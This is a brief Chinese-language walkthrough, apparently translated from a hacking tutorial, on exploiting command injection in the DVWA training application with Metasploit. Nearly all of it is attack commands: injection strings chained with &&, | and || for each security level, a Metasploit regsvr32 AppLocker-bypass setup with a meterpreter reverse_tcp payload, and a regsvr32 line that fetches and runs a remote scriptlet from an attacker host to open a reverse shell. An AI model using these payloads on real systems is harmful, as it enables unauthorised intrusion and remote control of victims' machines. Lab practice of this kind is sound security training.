## 使用Metasploit在DVWA中进行命令注入开发（绕过所有安全性）

### Low

`192.168.1.1 && pwd`

`192.168.1.1 && ls`

```bash
msf > use exploit/windows/misc/regsvr32_applocker_bypass_server
msf exploit(regsvr32_applocker_bypass_server) > set payload windows/meterpreter/reverse_tcp
msf exploit(regsvr32_applocker_bypass_server) > set lhost 192.168.1.106
msf exploit(regsvr32_applocker_bypass_server) > set lport  4444
msf exploit(regsvr32_applocker_bypass_server) > exploit
```

`192.168.1.100 && regsvr32 /s /n /u /i://192.168.1.103:8080/C99PdFH.sct scrobj.dll` [^1]

### Medium

`192.168.1.100 | regsvr32 /s /n /u /i://192.168.1.103:8080/C99PdFH.sct scrobj.dll`

### High

`192.168.1.100 || regsvr32 /s /n /u /i://192.168.1.103:8080/C99PdFH.sct scrobj.dll`

[原文](https://www.hackingarticles.in/command-injection-exploitation-dvwa-using-metasploit-bypass-security/)

---

[^1]: 使用这个命令打开远程主机上的端口，并使用metasploit连接回端口。